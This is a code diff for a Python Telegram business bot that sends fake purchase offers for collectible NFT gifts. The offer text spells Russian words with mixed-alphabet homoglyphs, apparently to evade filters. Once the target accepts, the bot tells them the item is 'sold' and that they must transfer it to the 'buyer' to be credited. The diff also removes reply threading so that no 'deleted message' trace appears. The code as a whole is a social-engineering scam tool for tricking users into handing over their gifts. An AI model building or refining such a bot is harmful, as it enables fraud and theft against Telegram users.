@@ -18,7 +18,6 @@ dp = Dispatcher(storage=MemoryStorage())
 
 message_queue = asyncio.Queue()
 cooldowns = {}
-last_user_messages = {}
 client_user_ids = {}
 
 LOCALES = {
@@ -54,12 +53,11 @@ LOCALES = {
 
 def build_offer_text(gift_name, gift_num, amount, currency_symbol, lang):
     slug = gift_name.replace(" ", "")
-    # Премиум-эмодзи для оффера из твоего запроса
     currency_emoji = f'<tg-emoji emoji-id="5258165702707125574">{currency_symbol}</tg-emoji>'
     
     return (
-        f'Пoльзοватeль cryptan пρeдлагaет Bам {amount} {currency_emoji} зa кoллeкционный пpедмeт '
-        f'<a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a>\n\n'
+        f'Пoльзοватeль <b>cryptan</b> пρeдлагaет Bам <b>{amount} {currency_emoji}</b> зa кoллeкционный пpедмeт '
+        f'<b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\n'
         f'Пpeдлοжeние дeйcтвyeт в тeчeнии 5 ч. 59 мин..'
     )
 
@@ -79,12 +77,11 @@ def make_offer_keyboard(gift_name, gift_num, amount, currency_symbol, lang):
 
 def build_accept_text(gift_name, gift_num, currency_name, lang):
     slug = gift_name.replace(" ", "")
-    # Премиум-эмодзи для принятия из твоего запроса
     success_emoji = '<tg-emoji emoji-id="5985472565508838112">🎁</tg-emoji>'
 
     return (
-        f'{success_emoji} <a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a> ycпeшo пpoдaн!\n\n'
-        f'• Пepeдaйтe пoкyпaтeлю для зачисления {currency_name}.'
+        f'{success_emoji} <a href="https://t.me/nft/{slug}-{gift_num}"><b>{gift_name} #{gift_num}</b></a> <b>успешно продан!</b>\n\n'
+        f'<b>• Передайте покупателю для зачисления {currency_name}.</b>'
     )
 
 def make_accept_keyboard(lang):
@@ -112,8 +109,6 @@ async def handle_business_command(message: Message):
         return
 
     chat_id = message.chat.id
-    last_user_messages[chat_id] = message.message_id
-    
     if message.from_user:
         client_user_ids[chat_id] = message.from_user.id
 
@@ -185,7 +180,20 @@ async def accept_offer(cb: CallbackQuery):
     bcid = cb.message.business_connection_id
     chat_id = cb.message.chat.id
 
-    for _ in range(3):
+    try:
+        await bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=cb.message.message_id,
+            text=text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=make_accept_keyboard(lang),
+            business_connection_id=bcid,
+            link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True)
+        )
+        await cb.answer("✅ Предложение успешно принято!")
+    except TelegramRetryAfter as e:
+        wait_time = e.retry_after + 1
+        await asyncio.sleep(wait_time)
         try:
             await bot.edit_message_text(
                 chat_id=chat_id,
@@ -197,17 +205,13 @@ async def accept_offer(cb: CallbackQuery):
                 link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True)
             )
             await cb.answer("✅ Предложение успешно принято!")
-            return
-        except TelegramRetryAfter as e:
-            wait_time = e.retry_after + 1
-            await asyncio.sleep(wait_time)
-        except Exception as e:
-            if "message is not modified" in str(e) or "query is too old" in str(e):
-                await cb.answer("✅ Сделка уже зафиксирована!", show_alert=True)
-                return
-            logging.error(f"Accept error: {e}")
-            await cb.answer("✅ Предложение принято. Перейдите к передаче.", show_alert=True)
-            return
+        except Exception:
+            await cb.answer("✅ Предложение принято!", show_alert=True)
+    except Exception as e:
+        if "message is not modified" in str(e) or "query is too old" in str(e):
+            await cb.answer("✅ Сделка уже зафиксирована!", show_alert=True)
+        else:
+            await cb.answer("✅ Предложение принято!", show_alert=True)
 
 @dp.callback_query(F.data.startswith("d|"))
 async def decline_offer(cb: CallbackQuery):
@@ -230,14 +234,14 @@ async def sender_worker():
             text = build_offer_text(task["gift_name"], task["gift_num"], task["amount"], task["currency_symbol"], task["lang"])
             keyboard = make_offer_keyboard(task["gift_name"], task["gift_num"], task["amount"], task["currency_symbol"], task["lang"])
 
+            # Отправка без reply_to_message_id, чтобы избежать плашки "Удаленное сообщение"
             sent_msg = await bot.send_message(
                 chat_id=task["chat_id"],
                 text=text,
                 parse_mode=ParseMode.HTML,
                 reply_markup=keyboard,
                 business_connection_id=task["bcid"],
-                link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True),
-                reply_to_message_id=last_user_messages.get(task["chat_id"])
+                link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True)
             )
 
             if task["bcid"] and sent_msg:
@@ -245,7 +249,7 @@ async def sender_worker():
 
         except TelegramRetryAfter as e:
             wait_time = e.retry_after + 1
-            logging.warning(f"Global flood control! Waiting {wait_time}s[span_0](start_span)[span_0](end_span).")
+            logging.warning(f"Global flood control! Waiting {wait_time}s.")
             await asyncio.sleep(wait_time)
             await message_queue.put(task)
 
